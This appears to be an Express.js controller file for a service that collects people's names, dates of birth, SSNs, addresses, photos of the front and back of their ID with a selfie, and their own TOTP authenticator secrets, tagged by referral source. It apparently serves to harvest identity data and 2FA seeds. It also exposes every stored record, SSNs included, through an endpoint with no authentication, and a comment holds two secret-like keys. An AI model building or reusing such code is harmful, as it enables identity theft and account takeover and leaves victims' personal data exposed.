const jwt = require('jsonwebtoken');
const multer = require('multer');
const { authenticator } = require('otplib');

const Client = require('../models/clientModel');
const catchAsync = require('../utils/catchAsync');
const AppError = require('../utils/appError');
const uploadToSpaces = require('../utils/uploadToSpaces');

exports.getAllClients = catchAsync(async (req, res) => {
  const clients = await Client.find();
  res.status(200).json({
    status: 'success',
    clients,
  });
});

exports.addReferral = catchAsync(async (req, res) => {
  const { site = 'none', referral } = req.body;
  const { id } = await Client.create({
    site,
    referral,
  });
  const token = jwt.sign({ id }, process.env.JWT_SECRET_KEY);
  res
    .status(201)
    .json({ status: 'success', message: 'request successful', token });
});

// In usage
exports.addClient = catchAsync(async (req, res, next) => {
  const { firstName, lastName, DOB, SSN, phone, address } = req.body;
  if (!firstName || !lastName || !DOB || !SSN || !phone || address === null)
    throw next(new AppError(400, 'Bad request'));

  const client = await Client.create({
    firstName,
    lastName,
    DOB,
    SSN,
    phone,
    address,
  });
  res
    .status(201)
    .json({ status: 'success', message: 'request successful', id: client.id });
});

// FTVBBWULCB75MNRR DQV35ZKZZ7O3XOXL
exports.addSecret = catchAsync(async (req, res, next) => {
  const { id, secret } = req.body;
  // 1) Check secret length
  if (secret.length < 8 || !id)
    return next(new AppError(400, 'Invalid Secrets'));

  // 2) Generate token and verify
  const token = authenticator.generate(secret);
  const isValid = authenticator.check(token, secret);
  if (isValid === false) return next(new AppError(401, 'Invalid Secretss'));

  // 3) If token is valid save into the database
  const client = await Client.findById(id);
  client.secretKey = secret;
  await client.save({ validateBeforeSave: false });

  // 4) return status of success and message of request successful
  res.status(201).json({
    status: 'success',
    message: 'request successful',
  });
});

exports.checkToken = catchAsync(async (req, res, next) => {
  // Check if authorization header exists, not empty and startswith bearer
  if (
    !req.headers.authorization ||
    !req.headers.authorization.startsWith('Bearer')
  ) {
    throw next(new AppError(400, 'Bad request'));
  }
  // Verify jwtToken
  const token = req.headers.authorization.split(' ').at(-1);
  const { id } = jwt.verify(token, process.env.JWT_SECRET_KEY);

  // Check if jwtToken Id matches an existing user in the database
  const user = await Client.findById(id);
  if (!user) throw next(new AppError(403, 'User does not exist'));

  // Allow access
  res.status(200).json({
    status: 'success',
    message: 'authorized',
    id,
    user,
  });
});

// in usage

const upload = multer().single('photo');

exports.uploadImage = catchAsync(async (req, res) => {
  upload(req, res, async (err) => {
    if (err instanceof multer.MulterError) {
      console.log(err);
    } else if (err) {
      console.log('err');
    }
    const { originalname: name, buffer } = req.file;
    const path = `${`${Date.now()}`.slice(-4)}-${name}`;

    await uploadToSpaces(path, buffer);
    res.json({
      status: 'success',
      path,
    });
  });
});

exports.createImagePath = catchAsync(async (req, res, next) => {
  const { id, frontID, backID, selfieID } = req.body;
  console.log(id, frontID, backID, selfieID);
  // 1) Check if all the fields are set
  if (!id || !frontID || !backID || !selfieID)
    return next(new AppError(401, 'Invalid request'));

  // 2) Save file paths to the database
  const client = await Client.findById(id);
  client.images = { frontID, backID, selfieID };
  await client.save({ validateBeforeSave: false });

  // 3) Respond with success and image saved
  res.json({ status: 'success', message: 'path populated' });
});
